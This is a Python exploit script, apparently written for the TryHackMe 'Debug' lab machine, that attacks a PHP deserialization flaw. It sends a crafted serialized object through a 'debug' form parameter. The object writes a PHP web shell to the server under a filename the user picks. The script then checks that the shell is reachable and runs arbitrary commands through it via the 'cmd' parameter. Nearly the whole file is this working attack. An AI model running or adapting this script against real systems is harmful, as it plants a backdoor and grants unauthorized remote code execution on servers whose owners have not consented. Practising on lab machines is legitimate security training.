#/bin/python3
import requests
import argparse

# Colors
cyan = "\033[1;36;40m "
yellow = "\033[1;33;40m "
white = "\033[1;37;40m "
red = "\033[1;31;40m "
green = "\033[1;32;40m "

def req(url, payload):
	return requests.get(url, params=payload).text

def deserialization_payload(payload):
	data = {
		"name": "sh3llr1ck0",
		"email": "sh3llr1ck0@mail.com",
		"comments": "Sh3llr1ck0 Comments",
		"select": "1",
		"debug": f"{payload}"
	}

	return data

def exploit(url, filename):
	length = len(filename)
	data = f'O:10:"FormSubmit":2:{{s:9:"form_file";s:{length}:"{filename}";s:7:"message";s:29:"<?php system($_GET[\'cmd\']);?>";s:70:"file_put_contents(__DIR__.\'/\'.form_file,message,FILE_USE_INCLUDE_PATH)"}}'
	payload = deserialization_payload(data)
	req(url+"index.php", payload)

def confirm_exploit(url, filename):
	response = requests.get(url+filename)
	if response.status_code == 200:
		print(green + "Exploit seems to work, use -rce filename and -command arguments." + white)
	else:
		print(red + "Got 404 answer, filename might be different. Remember to add extension, use same filename as -exploit." + white)

def rce(url, filename, code):
	return  yellow + requests.get(url + filename, params={"cmd": code}).text + white

def banner():
	print(cyan+" =======  \033 ||      \033 \033 =======  \033 \033 ==    \033 \033 ==    \033  \033       \033  \033    \033 \033          \033 \033        \033 \033   =====")
	print(cyan+"((        \033 ||      \033 \033       )) \033 \033  ||   \033 \033  ||   \033  \033       \033  \033    \033 \033          \033 \033 ||     \033 \033 ||    /||")
	print(cyan+"((        \033 ||      \033 \033       )) \033 \033  ||   \033 \033  ||   \033  \033       \033  \033 () \033 \033          \033 \033 ||  // \033 \033 ||  // ||")
	print(cyan+"  =====   \033   ===   \033 \033  ====    \033 \033  ||   \033 \033  ||   \033  \033       \033  \033    \033 \033   =====  \033 \033 || //  \033 \033 || //  ||")
	print(cyan+"       )) \033 ||   || \033 \033       )) \033 \033  ||   \033 \033  ||   \033  \033 = //  \033  \033 || \033 \033 ((       \033 \033 ||((   \033 \033 ||//   ||")
	print(cyan+"       )) \033 ||   || \033 \033       )) \033 \033  ||   \033 \033  ||   \033  \033  ||  \033  \033  || \033 \033 ((      \033 \033  || \\\\  \033 \033 ||/    ||")
	print(cyan+" =======  \033 ||   || \033 \033 =======  \033 \033    == \033 \033    == \033  \033  ||  \033  \033  || \033 \033   ===== \033 \033  ||  \\\\ \033 \033   =====")

if __name__ == "__main__":
	# Help menu
	parser = argparse.ArgumentParser(
		usage="python3 deserialziation2RCE.py [OPTIONS]",
		description="RCE script taking advantage of PHP deserialization vulnerability.",
		epilog="Script developed specifically for Debug tryhackme machine."
	)

	required = parser.add_argument_group("Required Arguments")
	required.add_argument("-u", help="Target website url.", metavar="URL", required=True)

	optional = parser.add_argument_group("Optional Arguments")
	optional.add_argument("-command", help="Command to execute in vulnerable server.", metavar="CMD", required=False)
	optional.add_argument("-confirm_exploit", help="Perform web request to confirm if exploit worked.", metavar="filename", required=False)
	optional.add_argument("-exploit", help="Exploit web vulnerability with filename of our choice.", metavar="filename", required=False)
	optional.add_argument("-rce", help="Remote Code Execution with file used in -exploit and -confirm_exploit functions", metavar="filename", required=False)
	optional.add_argument("-banner", help="Banner script.", action="store_true", required=False)

	args = parser.parse_args()

	if args.banner:
		banner()

	if args.confirm_exploit:
		filename = args.confirm_exploit
		url = args.u
		print(yellow + "Confirming exploitation.\n\n" + white)
		confirm_exploit(url, filename)

	if args.exploit:
		print(yellow + "Exploiting Web Vulnerability.\n\n" + white)
		filename = args.exploit
		url = args.u
		exploit(url, filename)

	if args.rce and args.command:
		filename = args.rce
		url = args.u
		code = args.command
		print(rce(url, filename, code))
